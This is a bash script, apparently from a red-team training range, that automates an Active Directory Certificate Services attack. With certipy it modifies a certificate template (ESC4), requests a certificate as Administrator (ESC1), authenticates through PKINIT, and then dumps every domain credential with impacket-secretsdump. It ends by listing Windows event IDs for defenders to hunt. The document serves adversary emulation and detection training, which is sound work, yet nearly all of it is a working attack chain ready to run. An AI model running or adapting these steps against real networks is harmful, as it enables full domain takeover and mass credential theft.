#!/bin/bash
# ============================================================
# TTP5: ADCS ESC4 → ESC1: Certificate Template Abuse → DCSync
# MITRE: T1649 — Steal or Forge Authentication Certificates
# MITRE: T1003.006 — OS Credential Dumping: DCSync
# APT28 Ref: Certificate-based domain takeover
# ============================================================
# PURPOSE: Generates Events 4899/4900 (template modification) on
#          SRV04-CA, Event 4887 (cert request with SAN), Event
#          4768 (PKINIT for Administrator), Event 4662 (DCSync).
# RUN FROM: Kali (attacker machine)
# PREREQ: svc_adm hash from TTP4
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
DCIP="${1:?Usage: $0 <DC_IP> <SVC_ADM_HASH>}"
SVC_ADM_HASH="${2:?Usage: $0 <DC_IP> <SVC_ADM_HASH>}"

echo "[*] TTP5: ADCS ESC4 → ESC1 → Domain Admin — T1649 / T1003.006"
echo "[*] Target: CorpAuth template on cyberange-CA"

# Sync clock
dc_time=$(nmap -p 445 --script smb2-time "$DCIP" 2>/dev/null | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}' | head -1)
[ -n "$dc_time" ] && sudo date -s "$dc_time" &>/dev/null && echo "[+] Clock synced: $dc_time"

cd "$TOOLS"
rm -f *.pfx 2>/dev/null

echo ""
echo "[*] Phase 1: Enumerate ADCS for vulnerable templates..."
certipy-ad find -u "svc_adm@$DOMAIN" -hashes ":$SVC_ADM_HASH" -dc-ip "$DCIP" \
    -vulnerable 2>&1 | tee "$LOOT/ttp5_certipy_find.txt"
sleep 2

echo ""
echo "[*] Phase 2: ESC4 — Modify CorpAuth template (enable Enrollee Supplies Subject)..."
echo "[*] This converts the safe template to ESC1-vulnerable"
echo ""
echo 'y' | certipy-ad template \
    -u "svc_adm@$DOMAIN" \
    -hashes ":$SVC_ADM_HASH" \
    -template CorpAuth \
    -write-default-configuration \
    -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_esc4_modify.txt"
sleep 3

echo ""
echo "[*] Phase 3: ESC1 — Request certificate as Administrator..."
echo ""
yes | certipy-ad req \
    -u "svc_adm@$DOMAIN" \
    -hashes ":$SVC_ADM_HASH" \
    -ca 'cyberange-CA' \
    -template 'CorpAuth' \
    -upn "Administrator@$DOMAIN" \
    -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_esc1_request.txt"

ADMIN_PFX=$(ls -t *.pfx 2>/dev/null | head -1)
if [ -z "$ADMIN_PFX" ]; then
    echo "[-] Certificate request failed."
    echo "[!] If certipy reports template not found, wait 60s for AD replication and retry."
    exit 1
fi
echo "[+] Certificate: $ADMIN_PFX"
sleep 2

echo ""
echo "[*] Phase 4: PKINIT — Authenticate as Administrator..."
certipy-ad auth -pfx "$ADMIN_PFX" -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp5_pkinit_admin.txt"

ADMIN_HASH=$(grep -oP '[a-f0-9]{32}' "$LOOT/ttp5_pkinit_admin.txt" | tail -1)
if [ -z "$ADMIN_HASH" ]; then
    echo "[-] PKINIT failed. Checking for TGT ccache..."
    ADMIN_CCACHE=$(ls -t *.ccache 2>/dev/null | head -1)
    if [ -n "$ADMIN_CCACHE" ]; then
        export KRB5CCNAME="$ADMIN_CCACHE"
        echo "[+] Using TGT: $ADMIN_CCACHE"
        echo ""
        echo "[*] Phase 5: DCSync via Kerberos ticket..."
        impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@DC01.$DOMAIN" 2>&1 | tee "$LOOT/ttp5_dcsync.txt"
    fi
else
    echo "[+] Administrator NT hash: $ADMIN_HASH"
    echo ""
    echo "[*] Phase 5: DCSync — Dumping ALL domain credentials..."
    impacket-secretsdump "$DOMAIN/Administrator@DC01.$DOMAIN" -hashes ":$ADMIN_HASH" 2>&1 | tee "$LOOT/ttp5_dcsync.txt"
fi

HASH_COUNT=$(grep -ac ":::" "$LOOT/ttp5_dcsync.txt" 2>/dev/null)
echo ""
echo "[+] Extracted $HASH_COUNT credential entries."

echo ""
echo "[+] TTP5 Complete. DOMAIN FULLY COMPROMISED."
echo "[+] Blue team: check SRV04-CA Security/Application log for:"
echo "    - Event 4899/4900 — Certificate template configuration changed (CorpAuth)"
echo "    - Event 4887 — Certificate request with Subject Alternative Name"
echo "[+] Blue team: check DC01 Security log for:"
echo "    - Event 4768 — Administrator TGT via PKINIT (certificate pre-auth)"
echo "    - Event 4662 — DCSync replication (DS-Replication-Get-Changes-All)"
echo "[+] Artifacts: $LOOT/ttp5_*"
